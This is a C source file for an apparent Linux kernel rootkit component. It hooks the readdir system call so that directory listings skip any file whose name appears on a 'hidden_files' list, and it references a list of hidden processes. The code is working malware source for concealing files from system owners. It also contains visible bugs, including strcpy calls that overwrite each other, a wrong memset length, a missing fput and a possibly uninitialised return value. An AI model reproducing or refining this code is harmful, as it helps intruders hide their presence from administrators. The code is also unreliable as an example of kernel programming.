#include <linux/types.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>
#include <linux/version.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/limits.h>
#include <linux/string.h>
#include <linux/fs.h>

#include "../tools/string_list.h"

#include "readdir_hook.h"

extern PStringList hidden_files;
extern PStringList hidden_procs;

#ifdef PTREGS_SYSCALL_STUBS

extern asmlinkage int (*orig_readdir)(const struct pt_regs *);
asmlinkage int hook_readdir(const struct pt_regs *regs){
    unsigned int fd = regs->di;
    struct old_linux_dirent* dirp = (struct old_linux_dirent*)regs->si;
    //unsigned int count = regs->dx;

#else

extern asmlinkage int (*orig_readdir)(unsigned int fd, struct old_linux_dirent* dirp, unsigned int count);
asmlinkage int hook_readdir(unsigned int fd, struct old_linux_dirent* dirp, unsigned int count){

#endif
    int ret, error;
    char *dir_name, *filename, *dir_name_start, *entry_name;
    struct file *dir_file;
    
    dir_name = (char*)kzalloc(PATH_MAX+1, GFP_KERNEL);
    filename = (char*)kzalloc(PATH_MAX+1, GFP_KERNEL);
    entry_name = (char*)kzalloc(NAME_MAX+1, GFP_KERNEL);
    if(dir_name == NULL || filename == NULL || entry_name == NULL){
        if(dir_name)
            kfree(dir_name);
        if(filename)
            kfree(filename);
        if(entry_name)
            kfree(entry_name);
#ifdef PTREGS_SYSCALL_STUBS
        return orig_readdir(regs);
#else
        return orig_readdir(fd, dirp, count);
#endif
    }

    dir_file = fget(fd);
    if(!dir_file)
        goto done;

    dir_name_start = d_path(&(dir_file->f_path), dir_name, PATH_MAX);
    if(IS_ERR(dir_name_start))
        goto done;
    
    while(true){
#ifdef PTREGS_SYSCALL_STUBS
        ret = orig_readdir(regs);
#else
        ret = orig_readdir(fd, dirp, count);
#endif
        if(ret != 1)
            goto done;
        memset(entry_name, 0, NAME_MAX);
        error = copy_from_user(entry_name, dirp->d_name, NAME_MAX);
        if(error)
            goto done;
        memset(filename, 0, GFP_KERNEL);
        strcpy(filename, dir_name_start);
        strcpy(filename, "/");
        strcpy(filename, entry_name);
        if(list_have(hidden_files, entry_name)){
            printk(KERN_INFO"Hide file %s\n", entry_name);
            continue;
        }else if(list_have(hidden_files, filename)){
            printk(KERN_INFO"Hide file %s\n", filename);
            continue;
        }
        else{
            goto done;
        }
    }
done:
    kfree(entry_name);
    kfree(dir_name);
    kfree(filename);
    return ret;
}
